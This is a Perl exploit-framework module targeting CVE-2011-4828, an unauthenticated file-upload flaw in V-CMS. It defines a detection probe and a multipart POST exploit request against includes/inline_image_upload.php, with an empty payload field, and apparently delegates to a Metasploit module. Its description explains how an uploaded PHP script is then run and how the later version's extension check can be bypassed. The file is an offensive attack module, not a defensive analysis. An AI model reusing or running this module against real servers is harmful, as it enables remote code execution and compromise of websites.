package VCMS::MSF::VcmsUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "VcmsUpload";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/includes/inline_image_upload.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /includes/inline_image_upload.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  CVE => "CVE-2011-4828",
  DESCRIPTION => "

          This module exploits a vulnerability found on V-CMS's inline image upload feature.

        The problem is due to the inline_image_upload.php file not checking the file type

        before saving it on the web server. This allows any malicious user to upload a

        script (such as PHP) without authentication, and then execute it with a GET request.



          The issue is fixed in 1.1 by checking the extension name.  By default, 1.1 only

        allows jpg, jpeg, png, gif, bmp, but it is still possible to upload a PHP file as

        one of those extension names, which may still be leveraged in an attack.

      ",
  METHOD => "POST",
  MSF_MODULE => "vcms_upload",
  OSVDB => 77183,
  PATH => "includes/inline_image_upload.php?",
  PATHS => ["includes/inline_image_upload.php", "vcms/"],
  PAYLOAD => "",
  REFERENCES => ["http://xforce.iss.net/xforce/xfdb/71358"],
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The URI path to vcms", VALUE => "/vcms/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'includes/inline_image_upload.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /includes/inline_image_upload.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=----x',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
